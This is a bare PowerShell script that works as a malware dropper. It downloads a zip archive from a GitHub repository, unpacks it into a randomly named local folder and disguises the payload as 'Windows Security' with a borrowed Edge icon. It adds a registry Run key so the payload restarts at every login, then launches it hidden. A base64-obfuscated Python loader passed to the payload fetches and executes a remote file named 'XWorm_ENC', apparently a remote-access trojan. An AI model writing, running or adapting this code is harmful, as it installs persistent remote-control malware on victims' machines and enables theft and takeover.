$CODE_LOADER = "import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sb25lbm9uZTgzODYvcmV4L3JlZnMvaGVhZHMvbWFpbi9YV29ybV9FTkMnKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpKSk='))"
$Random = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
(New-Object System.Net.WebClient).DownloadFile('https://github.com/lonenone8386/rex/raw/refs/heads/main/synaptics.zip', "$env:TEMP\$Random.zip")
$dst = "$env:LOCALAPPDATA\$Random"
Add-Type -AssemblyName System.IO.Compression.FileSystem
Remove-Item -Recurse -Force "$dst\*" -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $dst -Force | Out-Null
[IO.Compression.ZipFile]::ExtractToDirectory("$env:TEMP\$Random.zip", $dst)
$obj = New-Object -ComObject WScript.Shell;$link = $obj.CreateShortcut("$env:LOCALAPPDATA\WindowsSecurity.lnk");$link.WindowStyle = 7;$link.TargetPath = "$env:LOCALAPPDATA\$Random\synaptics.exe";$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13";$link.Arguments = "-c `"$CODE_LOADER`"";$link.Save()
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Security' -PropertyType String -Value 'C:\Windows\Explorer.EXE %LOCALAPPDATA%\WindowsSecurity.lnk' -Force
Start-Process "$env:LOCALAPPDATA\$Random\synaptics.exe" -ArgumentList "-c $CODE_LOADER" -WindowStyle Hidden
